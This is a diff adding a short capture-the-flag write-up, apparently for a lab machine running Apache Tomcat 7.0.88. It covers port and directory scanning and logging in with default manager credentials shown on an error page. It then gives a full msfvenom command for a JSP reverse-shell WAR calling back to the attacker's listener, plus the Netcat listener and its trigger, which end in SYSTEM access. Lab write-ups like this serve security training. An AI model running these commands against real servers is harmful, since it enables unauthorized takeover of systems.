@@ -1,0 +1,22 @@
+I started by performing two Nmap scans to identify open ports and services running on the target machine:
+sudo nmap -sC -sV -vv -Pn 10.10.10.95
+sudo nmap -p- -sC -sV 10.10.10.95 --open
+This revealed that Port 8080 was open and running Apache Tomcat 7.0.88. Navigating to http://10.10.10.95:8080/ in a browser displayed the default Apache Tomcat page. To discover additional directories, I used ffuf:
+ffuf -w /home/marco/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt \
+-u http://10.10.10.95:8080/FUZZ -c -ac -e .php,.html \
+-H "User-Agent: Mozilla/5.0"
+This revealed several directories, including /manager, /docs, and /examples. I attempted to log into http://10.10.10.95:8080/manager using common credentials:
+Username: admin
+Password: admin
+The login attempt failed, but the error page revealed valid credentials:
+Username: tomcat
+Password: s3cret
+Using these credentials, I successfully accessed Tomcat Manager. Since the Manager interface allows WAR file deployment, I generated a malicious payload using msfvenom:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=6969 -f war -o revshell.war
+I then uploaded revshell.war via the Tomcat Manager Deploy feature and set up a Netcat listener on my machine:
+nc -lvnp 6969
+To execute the payload, I navigated to:
+http://10.10.10.95:8080/revshell
+This successfully established a reverse shell connection. Checking my privileges with whoami revealed that I had NT AUTHORITY\SYSTEM access.
+Finally, I navigated to the Administrator's Desktop and retrieved the flag:
+dir C:\Users\Administrator\Desktop 
